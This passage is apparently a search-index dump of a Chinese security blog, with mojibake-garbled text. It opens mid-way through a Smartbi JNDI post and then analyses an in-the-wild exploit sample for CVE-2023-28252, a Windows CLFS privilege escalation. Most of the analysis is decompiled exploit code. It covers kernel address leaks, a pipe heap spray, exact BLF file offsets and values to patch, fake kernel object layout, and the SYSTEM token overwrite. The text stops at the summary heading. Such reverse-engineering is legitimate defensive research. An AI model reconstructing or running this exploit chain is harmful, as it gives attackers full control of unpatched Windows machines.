e3).setDetail(detail + e3.getMessage()); } } finally { if (conn != null) { try { conn.close(); } catch (Throwable th) { Logger.getLogger(getClass()).debug(SmartbiXDataSetUtil.OTHER); } } if (!ds.getUrl().startsWith(\u0026#34;JNDI:\u0026#34;)) { ConnectionPool.getInstance().closePool(ds); } } } é¢˜å¤–è¯ï¼Œæˆ‘æœ¬èº«ä¸æ‡‚Javaé‚£ä¸€å¥—ï¼Œåªæ˜¯æŒ‰ç…§ç²—æµ…çš„ä»£ç ç†è§£å»åˆ†ææ¼æ´ï¼Œæœ‰æœºä¼šå»åˆ†æä¸€ä¸‹JNDIæ³¨å…¥åŸç†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.smartbi.com.cn/patchinfo\nCreated at 2023-06-16T16:07:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/","title":"CVE-2023-28252","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ clfsä¸­å­˜åœ¨æƒé™æå‡æ¼æ´ã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º windows 10 21h2 19044.2728 windbg x64dbg æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• é™æ€åˆ†æ\næ ·æœ¬åŠ äº†Themidaçš„å£³ï¼Œå‚è€ƒ\rhttps://github.com/VenTaz/Themidieå¯¹å…¶è¿›è¡Œç»•è¿‡ã€‚\nè„±å£³ä¹‹ådumpå‡ºåŸå§‹æ ·æœ¬è¿›è¡Œåˆ†æï¼Œå¦‚ä¸‹ã€‚æ ¸å¿ƒé€»è¾‘åœ¨InitAndHeapSprayå‡½æ•°ä¸­ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) { ..... v3 = InitAndHeapSpray(); if ( !sub_7FF662B24F98() ) goto LABEL_20; if ( !v4 ) sub_7FF662B28D3C(); LOBYTE(v10) = 1; sub_7FF662B24CA4(v10, 0i64); return v3; } è¯¥å‡½æ•°é¦–å…ˆæ¸…ç©ºå·¥ä½œç›®å½•ï¼Œè€Œåé€šè¿‡æŸ¥è¯¢æ³¨å†Œè¡¨è·å–ç³»ç»Ÿç‰ˆæœ¬ï¼Œåœ¨é€šè¿‡NtQuerySystemInformationå‡½æ•°å¹¶ä¼ å…¥SystemExtendedHandleInformationå‚æ•°æ¥è·å–SystemåŠè‡ªèº«tokenåœ°å€ï¼Œå…¶é€»è¾‘å’ŒCVE-2022-37969åŸºæœ¬ä¸€æ ·\nsub_7FF662B265E4((int)NtCurrentTeb()-\u0026gt;NtTib.FiberData + v0); system(\u0026#34;del /f C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\.contain* 2\u0026gt; nul 1\u0026gt; nul\u0026#34;);// åˆ é™¤æ–‡ä»¶ system(\u0026#34;del /f C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog* 2\u0026gt; nul 1\u0026gt; nul\u0026#34;); system(\u0026#34;del /f C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\p_* 2\u0026gt; nul 1\u0026gt; nul\u0026#34;); *(_QWORD *)\u0026amp;dwProcessId = GetCurrentProcessId(); if ( !(unsigned int)CheckOSVersion() ) return 0i64; if ( (unsigned int)GetObjectKernelAddress() ) { sub_7FF662B21010((__int64)\u0026#34;fail RW\\\\n\u0026#34;); return 0i64; } è€Œååˆå§‹åŒ–å¹¶è·å–ä¸€ç³»åˆ—å†…æ ¸å‡½æ•°åœ°å€ï¼ŒåŒ…æ‹¬ClfsEarlierLsnã€ClfsMgmtDeregisterManagedClientã€SeSetAccessStateGenericMappingã€RtlClearBitï¼Œè·å–æ–¹å¼å’ŒCVE-2022-37969åŸºæœ¬ä¸€æ ·ã€‚é€šè¿‡LoadLibraryExåœ¨r3è½½å…¥ntoskrnl.exeã€clfs.sysè·å–åˆ°å‡½æ•°ç›¸å¯¹äºåŸºå€çš„åç§»ï¼Œè€Œåé€šè¿‡NtQuerySystemInformationå¹¶ä¼ å…¥SystemModuleInformationè·å–åˆ°å†…æ ¸è½½å…¥çš„æ‰€æœ‰æ¨¡å—çš„åŸºå€ã€‚é€šè¿‡æ¯”è¾ƒæ¨¡å—çš„FullPathNameæ¥ç¡®å®šclfs.syså’Œntoskrnl.exeåœ¨å†…æ ¸çš„åŸºå€ï¼Œå°†å†…æ ¸åŸºå€å’Œå‡½æ•°åç§»ç›¸åŠ å³å¯è·å¾—å‡½æ•°åœ¨å†…æ ¸çš„åœ°å€\nClfsEarlierLsnKernelAddress = (__int64)GetKernelFuncAddr(\u0026#34;ClfsEarlierLsn\u0026#34;); if ( !ClfsEarlierLsnKernelAddress ) return 0i64; ClfsMgmtDeregisterManagedClientAddress = (__int64)GetKernelFuncAddr(\u0026#34;ClfsMgmtDeregisterManagedClient\u0026#34;); if ( versionFlag ) { ntoskrnl_KernelBase = FindKernelModulesBase(\u0026#34;\\\\\\\\SystemRoot\\\\\\\\system32\\\\\\\\ntoskrnl.exe\u0026#34;); Library = LoadLibraryExW(L\u0026#34;ntoskrnl.exe\u0026#34;, 0i64, 1u); v4 = 0i64; v5 = (__int64)Library; if ( Library ) { PoFxProcessorNotificationAddress = GetProcAddress(Library, \u0026#34;PoFxProcessorNotification\u0026#34;); if ( !PoFxProcessorNotificationAddress ) goto LABEL_18; sub_7FF662E7AF0D(v5); PoFxProcessorNotificationKernelAddress = (__int64)PoFxProcessorNotificationAddress + (_QWORD)ntoskrnl_KernelBase - v5; } else { PoFxProcessorNotificationKernelAddress = 0i64; } PoFxProcessorNotificationKernelAddress1 = PoFxProcessorNotificationKernelAddress; ntoskrnl_kernel_base = FindKernelModulesBase(\u0026#34;\\\\\\\\SystemRoot\\\\\\\\system32\\\\\\\\ntoskrnl.exe\u0026#34;); ntoskrnl_base = LoadLibraryExW(L\u0026#34;ntoskrnl.exe\u0026#34;, 0i64, 1u); v10 = (__int64)ntoskrnl_base; if ( !ntoskrnl_base ) { SeSetAccessStateGenericMappingAddressKernelAddr = 0i64; goto LABEL_21; } SeSetAccessStateGenericMappingAddress = GetProcAddress(ntoskrnl_base, \u0026#34;SeSetAccessStateGenericMapping\u0026#34;); if ( SeSetAccessStateGenericMappingAddress ) { sub_7FF662E7AF0D(v10); SeSetAccessStateGenericMappingAddressKernelAddr = (__int64)SeSetAccessStateGenericMappingAddress + (_QWORD)ntoskrnl_kernel_base - v10; æ ·æœ¬åœ¨0x5000000ä½ç½®å¤„ç”³è¯·å¤§å°0x100000çš„å†…å­˜ï¼Œå¾ˆæ˜æ˜¾è¿™å—å’ŒCVE-2022-37969çš„ç”³è¯·å†…å­˜ä¸€æ ·ï¼Œè€Œåå°†ntdll.dllè½½å…¥åˆ°è¿›ç¨‹ä¸­å¹¶è·å–NtQuerySystemInformationå‡½æ•°åœ°å€ï¼Œé€šè¿‡CreateFileæ‰“å¼€C:\\Users\\Public\\p_%08dæ ¼å¼æ–‡ä»¶çš„å¥æŸ„å¹¶éªŒè¯å¥æŸ„æœ‰æ•ˆæ€§ï¼Œæ¥ç€è·å–åˆ°NtFsControlFileå‡½æ•°åœ°å€\nif ( !VirtualAlloc((LPVOID)0x5000000, 0x100000ui64, 0x3000u, 4u) ) return 0i64; v24 = rand(); memset(v96, 0, sizeof(v96)); wsprintf((__int64)v96, (__int64)L\u0026#34;C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\p_%08d\u0026#34;, v24); Filew = CreateFilew((__int64)v96, 0xC0000000i64, 0i64, 0i64, 2, 256, 0i64); if ( Filew == -1 ) { sub_7FF662E75E1F(); return 1i64; } ntdll_hmodule = (HMODULE)LoadLibrary((__int64)L\u0026#34;ntdll\u0026#34;); NtQuerySystemInformationAddress = (NTSTATUS (__stdcall *)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(ntdll_hmodule, \u0026#34;NtQuerySystemInformation\u0026#34;); if ( NtQuerySystemInformationAddress ) { for ( i = 20; ; i = v82 ) ...... } if ( !v31 ) { ...... while ( 1 ) { object = (__int64)*(p_UniqueProcessId - 1); if ( v33 == *p_UniqueProcessId \u0026amp;\u0026amp; p_UniqueProcessId[1] == (HANDLE)Filew )// è¿™é‡Œè·å–çš„æ˜¯å‰é¢é€šè¿‡CreateFileè¿”å›çš„å¥æŸ„object break; v27 = (unsigned int)(v27 + 1); p_UniqueProcessId += 5; if ( (int)v27 \u0026gt;= v30-\u0026gt;NumberOfHandles ) goto LABEL_46; } qword_7FF662B44710 = (__int64)*(p_UniqueProcessId - 1);// Object if ( object ) goto LABEL_51; } else { LABEL_46: qword_7FF662B44710 = 0i64; } return 1i64; } } qword_7FF662B44710 = 1i64; LABEL_51: *(_OWORD *)hReadPipe = 0i64; Size = 0i64; LODWORD(v82) = 0; if ( versionFlag ) { LODWORD(v36) = LoadModule(\u0026#34;ntdll\u0026#34;, (LPVOID)v27); NtFsControlFileAddress = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD, _DWORD, _QWORD, _DWORD))GetProcAddress(v36, \u0026#34;NtFsControlFile\u0026#34;); æ ·æœ¬åˆ›å»ºåŒ¿åç®¡é“å¹¶è°ƒç”¨NtFsControlFileå‡½æ•°ï¼Œé€šè¿‡ä¼ å…¥0x11003Cï¼Œä½¿å¾—ä¹‹åæˆ‘ä»¬å¯ä»¥å†æ¬¡è°ƒç”¨NtFsControlFileå¹¶ä¼ å…¥0x110038æ¥è·å–åˆ°ç®¡é“çš„å±æ€§ï¼Œè¿™ç‚¹åˆ©ç”¨å’ŒCVE-2022-37969ä¸€æ ·ã€‚åœ¨åˆ›å»ºåŒ¿åç®¡é“åé€šè¿‡NtQuerySystemInformationå‡½æ•°è·å–åˆ°å†…æ ¸ä¸­çš„å †ä¿¡æ¯ï¼Œå¹¶é€šè¿‡æ¯”è¾ƒå †å¤§å°å’Œtagè·å–åˆ°è¿™ä¸ªç®¡é“åœ¨å†…æ ¸ä¸­å¯¹åº”çš„å †å†…å­˜ã€‚\nif ( !CreatePipe(\u0026amp;hReadPipe[1], hReadPipe, 0i64, 0x10000u) ) { sub_7FF662E77D93(0i64); __debugbreak(); } Size = (size_t)malloc(0x2000ui64); v37 = (_WORD *)Size; memset((void *)(Size + 2), 65, 0xFFEui64); *v37 = 90; sub_7FF662B21B80(4096, \u0026#34;NpAt\u0026#34;, 1, 0i64); memset(v95, 66, 0xFFui64); NtFsControlFileAddress(hReadPipe[0], 0i64, 0i64, 0i64, v92, 0x11003C, v37, 4056, v95, 256); sub_7FF662B21B80(4096, \u0026#34;NpAt\u0026#34;, 0, (unsigned __int64 *)\u0026amp;qword_7FF662B440C8); ä¹‹ååœ¨0xFFFFFFFFåœ°å€å¤„ç”³è¯·0x1000å¤§å°çš„å†…å­˜ï¼Œå¹¶å°†system tokenå¸ƒå±€åˆ°è¯¥åœ°å€ï¼Œè¿™ç‚¹å’ŒCVE-2022-37969ä¸€è‡´ã€‚åœ¨CVE-2022-37969ä¸­è¯¥å¤„ç”¨äºå†™å…¥tokenã€‚\nLODWORD(v82) = system_EPROCESS \u0026amp; 0xFFF; v38 = system_EPROCESS \u0026amp; 0xFFFFFFFFFFFFF000ui64; if ( !VirtualAlloc( // åœ¨0xFFFFFFFFåœ°å€ç”³è¯·å†…å­˜ (LPVOID)0xFFFFFFFFi64, 0x1000ui64, 0x3000u, 4u) ) return 0i64; memset((void *)0x100000007i64, 0, 0xFF8ui64); MEMORY[0xFFFFFFFF] = v38; // åœ¨0xFFFFFFFFå†™å…¥system proc token MEMORY[0x100000007] = 0x414141414141005Ai64; åœ¨ä¹‹åå°±æ˜¯æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒé€»è¾‘ã€‚åˆ›å»ºä¸€ä¸ªæ—¥å¿—æ–‡ä»¶Mylogå¹¶å¯¹ä»¥ä¸‹çš„åç§»è¿›è¡Œäº†ä¿®æ”¹å¹¶å¯¹CRCè¿›è¡Œäº†ä¿®å¤ï¼Œè¿™é‡Œå°†å…¶ç§°ä¹‹ä¸ºä¸»blfæ–‡ä»¶ã€‚\nä¿®æ”¹æ—¥å¿—æ–‡ä»¶ä¹‹åæ‰“å¼€æ—¥å¿—æ–‡ä»¶å¹¶é€šè¿‡NtQuerySystemInformationæŸ¥è¯¢åˆ°è¿™ä¸ªæ—¥å¿—æ–‡ä»¶çš„base blockçš„å†…æ ¸åœ°å€ï¼Œè€Œåè°ƒç”¨AddLogContainerä¸ºè¯¥æ–‡ä»¶æ·»åŠ å®¹å™¨ã€‚\n0x80c -\u0026gt; crc32 4å­—èŠ‚ 0x858 -\u0026gt; 0x369 4å­—èŠ‚ 0x1dd0 -\u0026gt; 0x15a0 4å­—èŠ‚ 0x1dd4 -\u0026gt; 0x1570 4å­—èŠ‚ 0x1de0 -\u0026gt; 0xC1FDF008 4å­—èŠ‚ 0x1de4 -\u0026gt; 0x30 4å­—èŠ‚ 0x1df8 -\u0026gt; 0x5000000 4å­—èŠ‚ 0x820c -\u0026gt; crc32 4å­—èŠ‚ 0x8258 -\u0026gt; 0x369 4å­—èŠ‚ 0x97D0 -\u0026gt; 0x15A0 4å­—èŠ‚ 0x97D4 -\u0026gt; 0x1570 4å­—èŠ‚ 0x97E0 -\u0026gt; 0xC1FDF008 4å­—èŠ‚ 0x97E4 -\u0026gt; 0x30 4å­—èŠ‚ 0x97F8 -\u0026gt; 0x5000000 4å­—èŠ‚ __int64 CraftFile() { ...... wsprintf((__int64)pszLogFileName, (__int64)L\u0026#34;LOG:C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog_%08d\u0026#34;, (unsigned int)(v0 + 16385)); wsprintf((__int64)\u0026amp;unk_7FF662B44110, (__int64)L\u0026#34;C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog_%08d.blf\u0026#34;, (unsigned int)(v0 + 16385)); ::pszLogFileName = (LPCWSTR)malloc(0x500ui64); wsprintf((__int64)\u0026amp;pwszContainerPath, (__int64)L\u0026#34;C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\.container_1%d\u0026#34;, (unsigned int)(v0 + 1)); sub_7FF662E7B416((__int64)\u0026amp;unk_7FF662B44110); sub_7FF662E7B416((__int64)\u0026amp;pwszContainerPath); LogFile = CreateLogFile(pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); CloseHandle(LogFile); Buffer = 0x369; Filew = (void *)CreateFilew((__int64)\u0026amp;unk_7FF662B44110, 0xC0000000i64, 7i64, 0i64, 3, 128, 0i64); SetFilePointer(Filew, 0x858, 0i64, 1u); ...... Buffer = 0x5000000; v7 = (void *)CreateFilew((__int64)\u0026amp;unk_7FF662B44110, 0xC0000000i64, 7i64, 0i64, 3, 128, 0i64); SetFilePointer(v7, 0x1DF8, 0i64, 1u); if ( !WriteFile(v7, \u0026amp;Buffer, 4u, NumberOfBytesWritten, 0i64) ) { sub_7FF662E775CF(0i64, 0i64, L\u0026#34;Error\\\\n\u0026#34;, 0i64); sub_7FF662E77D93(1i64); __debugbreak(); } CloseHandle(v7); CrcPatchFile((__int64)\u0026amp;unk_7FF662B44110, 0x800i64, 0x7A00i64); ...... } CloseHandle(v13); CrcPatchFile((__int64)\u0026amp;unk_7FF662B44110, 0x8200i64, 0x7A00i64); dword_7FF662B449B8 = 0; *(_QWORD *)NumberOfBytesWritten = 0i64; sub_7FF662B21B80(0x7A00, \u0026#34;Clfs\u0026#34;, 1, 0i64); // æŸ¥è¯¢å †å†…ä¿¡æ¯ v14 = CreateLogFile(pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0);// LOG:C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog_%08d sub_7FF662B21B80(0x7A00, \u0026#34;Clfs\u0026#34;, 0, (unsigned __int64 *)NumberOfBytesWritten);// NumberOfBytesWritten æŒ‡å‘äº†æœ€åä¸€ä¸ªclfsæ± ï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€ä¸ªclfs åŸºæœ¬å—çš„åœ°å€ if ( !*(_QWORD *)NumberOfBytesWritten ) { system(\u0026#34;pause\u0026#34;); sub_7FF662E77D93(1i64); __debugbreak(); } MyLog__08d_base_block = *(_QWORD *)NumberOfBytesWritten; hLog = v14; wsprintf((__int64)::pszLogFileName, (__int64)L\u0026#34;%s\u0026#34;, pszLogFileName); pcbContainer[0] = 512i64; return ((__int64 (__fastcall *)(HANDLE, ULONGLONG *, WCHAR *, _QWORD))AddLogContainer)( hLog, pcbContainer, \u0026amp;pwszContainerPath, 0i64); } ä¹‹åé€šè¿‡CreateLogFileåˆ›å»º10ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹ä»¥ä¸‹åç§»ï¼Œè¿™é‡Œå°†å…¶ç§°ä¹‹ä¸ºå‰¯blfæ–‡ä»¶ã€‚\nè¯»å–0-0x400åˆ°ç¼“å†²åŒºå¹¶å°†ä»¥ä¸‹åç§»çš„å€¼ä¿®æ”¹ 0x70 -\u0026gt; 0 4å­—èŠ‚ 0x06 -\u0026gt; 2 4å­—èŠ‚ è€Œåå°†è¿™ä¸ªç¼“å†²åŒºå†™å…¥åˆ°åç§»0x400å¤„ 0x06 -\u0026gt; 0x1 4å­—èŠ‚ 0x0c -\u0026gt; crc32 4å­—èŠ‚ 0x70 -\u0026gt; 0x2 4å­—èŠ‚ 0x84 -\u0026gt; 0x2 4å­—èŠ‚ 0x88 -\u0026gt; 0x4 4å­—èŠ‚ 0x8A -\u0026gt; 0x4 4å­—èŠ‚ 0x90 -\u0026gt; 0x1 4å­—èŠ‚ 0x94 -\u0026gt; 0x3 4å­—èŠ‚ 0x9C -\u0026gt; 0x2 4å­—èŠ‚ 0x406 -\u0026gt; 2 4å­—èŠ‚ 0x40c -\u0026gt; crc32 0x470 -\u0026gt; 0 4å­—èŠ‚ 0x484 -\u0026gt; 0x2 4å­—èŠ‚ 0x488 -\u0026gt; 0x13 4å­—èŠ‚ 0x48A -\u0026gt; 0x13 4å­—èŠ‚ 0x1B98 -\u0026gt; 0x65C8 0x80c -\u0026gt; crc32 0x820c -\u0026gt; crc32 0x9598 -\u0026gt; 0x65C8 void __fastcall fun_tigger(const WCHAR *a1, __int64 a2) { ...... DWORD NumberOfBytesWritten; // [rsp+44h] [rbp-14h] BYREF sub_7FF662E7B416(a2); LogFile = CreateLogFile(a1, 0xC0000000, 1u, 0i64, 4u, 0);// LOG:C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\MyLog%d%08d if ( LogFile == (HANDLE)-1i64 ) { sub_7FF662E77D93(1i64); __debugbreak(); } CloseHandle(LogFile); v5 = malloc(0x400ui64); ...... CrcPatchFile(a2, 0x800, 0x7A00u); v19 = (void *)CreateFilew(a2, 0xC0000000i64, 7i64, 0i64, 3, 128, 0i64); SetFilePointer(v19, 0x9598, 0i64, 1u); if ( !WriteFile(v19, \u0026amp;Buffer, 4u, \u0026amp;NumberOfBytesWritten, 0i64) ) { sub_7FF662E775CF(0i64, 0i64, L\u0026#34;Error\\\\n\u0026#34;, 0i64); sub_7FF662E77D93(1i64); __debugbreak(); } CloseHandle(v19); CrcPatchFile(a2, 0x8200, 0x7A00u); free(v5); } ä½¿ç”¨åŒ¿åç®¡é“è¿›è¡Œå †å¸ƒå±€ï¼Œé€šè¿‡è°ƒç”¨func_pipesprayå¹¶ä¸¤æ¬¡åˆ†åˆ«ä¼ å…¥0x5000å’Œ0x4000æ¥ç”³è¯·0x5000å¯¹å’Œ0x4000å¯¹åŒ¿åpipeï¼Œ\nHANDLE *__fastcall func_pipespray(int a1) { bool v2; // of size_t v3; // rcx HANDLE *v4; // rbx __int64 v5; // rdi int v6; // esi v2 = (unsigned __int64)(unsigned int)a1 \u0026gt;\u0026gt; 28 != 0; v3 = (unsigned int)(16 * a1); if ( v2 ) v3 = -1i64; v4 = (HANDLE *)malloc(v3); if ( !v4 ) { sub_7FF662E77D93(1i64); __debugbreak(); } LODWORD(v5) = 0; if ( a1 \u0026gt; 0 ) { v6 = 0; do { if ( !(unsigned int)CreatePipe((__int64)\u0026amp;v4[v6], (__int64)\u0026amp;v4[v6 + 1], 0i64, 0x60i64) ) { v5 = (int)v5; if ( (int)v5 \u0026gt; 0 ) { do { CloseHandle(*v4); CloseHandle(v4[1]); v4 += 2; --v5; } while ( v5 ); } sub_7FF662E77D93(1i64); JUMPOUT(0x7FF662B227AEi64); } LODWORD(v5) = v5 + 1; v6 += 2; } while ( (int)v5 \u0026lt; a1 ); } return v4; } é¦–å…ˆéå†0x5000å¯¹pipeçš„pipe_array_aï¼Œå¹¶é€šè¿‡WriteFileå†™å…¥é•¿åº¦ä¸º12çš„æŒ‡é’ˆæ•°ç»„ï¼Œå…¶å†…å®¹ä¸ºç¬¬ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶çš„base blockã€‚\nBuffer[0] = MyLog__08d_base_block + 0x30; Buffer[1] = MyLog__08d_base_block + 0x30; Buffer[2] = MyLog__08d_base_block + 0x30; Buffer[3] = MyLog__08d_base_block + 0x30; Buffer[4] = MyLog__08d_base_block + 0x30; Buffer[5] = MyLog__08d_base_block + 0x30; Buffer[6] = MyLog__08d_base_block + 0x30; Buffer[7] = MyLog__08d_base_block + 0x30; Buffer[8] = MyLog__08d_base_block + 0x30; Buffer[9] = MyLog__08d_base_block + 0x30; Buffer[10] = MyLog__08d_base_block + 0x30; Buffer[11] = MyLog__08d_base_block + 0x30; for ( j = 0i64; j \u0026lt; 0x5000; ++j ) { if ( !WriteFile(*v46, Buffer, 0x60u, \u0026amp;NumberOfBytesWritten, 0i64) ) { do { CloseHandle(*pipe_array_a); CloseHandle(pipe_array_a[1]); pipe_array_a += 2; --v42; } while ( v42 ); sub_7FF662E77D93(1i64); JUMPOUT(0x7FF662B243B7i64); } v46 += 2; } è€Œåä»ç¬¬0x1000å¯¹å¼€å§‹ï¼Œé‡Šæ”¾0x667å¯¹pipeï¼Œé‡Šæ”¾ç»“æŸååˆ›å»ºæ—¥å¿—æ–‡ä»¶å¯¹é‡Šæ”¾åçš„å†…å­˜è¿›è¡Œå ä½\nfor ( j = 0i64; j \u0026lt; 0x5000; ++j ) { if ( !WriteFile(*v46, Buffer, 0x60u, \u0026amp;NumberOfBytesWritten, 0i64) ) { do { CloseHandle(*pipe_array_a); CloseHandle(pipe_array_a[1]); pipe_array_a += 2; --v42; } while ( v42 ); sub_7FF662E77D93(1i64); JUMPOUT(0x7FF662B243B7i64); } v46 += 2; } v48 = pipe_array_a + 0x2000; v49 = 0x667i64; do { CloseHandle(*v48); // é‡Šæ”¾Pipe CloseHandle(v48[1]); v48 += 10; --v49; } while ( v49 ); v50 = 0xAi64; v51 = hObject; v52 = 0xAi64; v53 = pszLogFileName; do { LogFile = CreateLogFile(v53, 0xC0000000, 1u, 0i64, 4u, 0); v53 += 256; *v51++ = LogFile; --v52; } while ( v52 ); å ä½ç»“æŸåï¼Œå¯¹ç¬¬äºŒæ¬¡ç”³è¯·çš„0x4000å¯¹pipe_array_bè°ƒç”¨WriteFileå†™å…¥æŒ‡é’ˆæ•°ç»„ï¼Œè€Œåå¯¹0x5000030å¤„å†…å­˜è¿›è¡Œå¸ƒå±€ï¼Œå¾ªç¯å°è¯•è§¦å‘æ¼æ´ï¼Œé¦–å…ˆä¸ºåˆ›å»ºçš„10ä¸ªå‰¯blfæ–‡ä»¶æ·»åŠ log containerï¼Œåœ¨æ¯æ¬¡æ·»åŠ å®¹å™¨ä¹‹åï¼Œé€šè¿‡CreateLogFileæ‰“å¼€ä¸»blfæ–‡ä»¶çš„å¥æŸ„ï¼ˆç¬¬ä¸€ä¸ªåˆ›å»ºçš„æ—¥å¿—æ–‡ä»¶ã€‚ï¼‰è€Œåå°è¯•é€šè¿‡NtFsControlFileAddresså‡½æ•°è¯»å–tokenï¼Œåœ¨è¯»å–ä¹‹ååˆ¤æ–­tokenæœ‰æ•ˆæ€§ï¼Œæœ‰æ•ˆåˆ™é€€å‡ºå¾ªç¯ã€‚\ndo { if ( !WriteFile(*v56, Buffer, 0x60u, \u0026amp;v87, 0i64) ) { do { CloseHandle(*pipe_array_b); CloseHandle(pipe_array_b[1]); pipe_array_b += 2; --v43; } while ( v43 ); sub_7FF662E77D93(1i64); __debugbreak(); } ++v55; v56 += 2; } while ( v55 \u0026lt; 0x4000 ); pcbContainer = 512i64; if ( versionFlag ) { v57 = Size; v58 = hObject; v59 = 0; while ( 1 ) { AddLogContainer(*v58, \u0026amp;pcbContainer, (LPWSTR)\u0026amp;v97[256 * (__int64)v59], 0i64); MEMORY[0x5000030] = qword_7FF662B44710; MEMORY[0x5000000] = 0x5001000i64; MEMORY[0x5001000] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001010] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001018] = ClfsEarlierLsnKernelAddress; ...... MEMORY[0x50011F8] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001008] = PoFxProcessorNotificationKernelAddress1; MEMORY[0x5000040] = 83886080i64; MEMORY[0x5000068] = ClfsMgmtDeregisterManagedClientAddress; MEMORY[0x5000048] = 83887104i64; MEMORY[0x5000400] = 83890944i64; MEMORY[0x5000448] = ntap_address+ 24; MEMORY[0x5001328] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001308] = SeSetAccessStateGenericMappingAddressKernelAddr; CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); v80 = 90; NtFsControlFileAddress(hReadPipe[0], 0i64, 0i64, 0i64, v91, 0x110038, \u0026amp;v80, 2, v57, 0x2000); v60 = (unsigned int)system_token_object + (__int64)token_offset; v61 = *(_QWORD *)(v60 + v57 + 8); if ( *(_QWORD *)(v60 + v57) \u0026gt;= 0x8181818181818181ui64 ) break; ...... if ( v59 \u0026gt;= 0xA ) goto LABEL_76; } MEMORY[0xFFFFFFFF] = *(_QWORD *)(v60 + v57); MEMORY[0x100000007] = v61; MEMORY[0x5000448] = current_token - 8; CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); MEMORY[0xFFFFFFFF] = 0x1470i64; MEMORY[0x100000007] = 0i64; MEMORY[0x5000448] = MyLog__08d_base_block + 912; CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); ä»è¿™æ®µä»£ç å¯ä»¥æ˜æ˜¾çœ‹åˆ°CVE-2022-37969åˆ©ç”¨çš„å½±å­ï¼ŒåŒ…æ‹¬å¸ƒå±€0x5000000å†…å­˜ï¼Œç–‘ä¼¼ä¼ªé€ CClfsContainerå¯¹è±¡ï¼Œåˆ©ç”¨ClfsEarlierLsnã€SeSetAccessStateGenericMappingAddressè¿›è¡Œä»»æ„åœ°å€è¯»å†™ï¼Œä¸åŒçš„æ˜¯æœ¬æ¬¡æ ·æœ¬ä¸­å¢åŠ äº†ClfsMgmtDeregisterManagedClientå’ŒPoFxProcessorNotificationå‡½æ•°ã€‚åŒæ—¶å’ŒCVE-2022-37969ä¸€æ ·çš„æ˜¯ä¸¤æ¬¡è§¦å‘äº†æ¼æ´ï¼Œåˆ†åˆ«è¯»å–system tokenå’Œå°†system tokenå†™å…¥åˆ°è‡ªèº«tokenï¼Œè¾¾æˆææƒã€‚\nåŒæ—¶è¿˜æ³¨æ„åˆ°ï¼Œæ ·æœ¬é›†æˆäº†åˆ©ç”¨RtlClearBitè¿›è¡Œææƒçš„æŠ€æœ¯ï¼Œç”±ä¸€ä¸ªå…¨å±€flagæ§åˆ¶å†³å®šä½¿ç”¨å“ªç§æ–¹å¼ï¼Œå…¶whileå¾ªç¯å†…é€»è¾‘å’Œå‰ä¸€ç§åˆ©ç”¨æ–¹å¼ä¸€æ ·ã€‚\nelse { v63 = 0; v64 = hObject; while ( 1 ) { AddLogContainer(*v64, \u0026amp;pcbContainer, (LPWSTR)\u0026amp;v97[256 * (__int64)v63], 0i64); MEMORY[0x5000000] = 0x5001000i64; MEMORY[0x5000030] = qword_7FF662B44710; MEMORY[0x5001008] = ClfsEarlierLsnKernelAddress; ...... MEMORY[0x50011F8] = ClfsEarlierLsnKernelAddress; MEMORY[0x5001000] = ClfsMgmtDeregisterManagedClientAddress; MEMORY[0x5001028] = RtlClearBitKernelAddress; MEMORY[0x5000008] = *(_QWORD *)(addr_array + 48) + *(unsigned int *)(addr_array + 56); CreateLogFile(::pszLogFileName, 0xC0010000, 3u, 0i64, 4u, 0); v65 = system_TOKEN; system_token_object = 0i64; v66 = *(void (__fastcall **)(__int64, size_t *, __int64, __int64, char *))(addr_array + 16); v67 = sub_7FF662E78B70(); v66(v67, \u0026amp;system_token_object, v65, 8i64, v88); if ( system_token_object \u0026gt;= 0x8181818181818181ui64 ) break; ...... if ( v63 \u0026gt;= 0xA ) goto LABEL_88; } v68 = current_token; Size = system_token_object; v69 = *(void (__fastcall **)(__int64, __int64, size_t *, __int64, char *))(addr_array + 16);// NtWriteVirtualMemory v70 = sub_7FF662E78B70(); v69(v70, v68, \u0026amp;Size, 8i64, v89); v71 = MyLog__08d_base_block; v83 = 5232; v72 = *(void (__fastcall **)(__int64, __int64, int *, __int64, char *))(addr_array + 16); v73 = sub_7FF662E78B70(); v72(v73, v71 + 920, \u0026amp;v83, 4i64, v90); LOBYTE(v80) = 1; v74 = *(_QWORD *)(addr_array + 48) + *(unsigned int *)(addr_array + 56); v75 = *(void (__fastcall **)(__int64, __int64, __int16 *, __int64, char *))(addr_array + 16); v76 = sub_7FF662E78B70(); v75(v76, v74, \u0026amp;v80, 1i64, v91); LABEL_88: ..... v77 = v98; æ€»ç»“æ 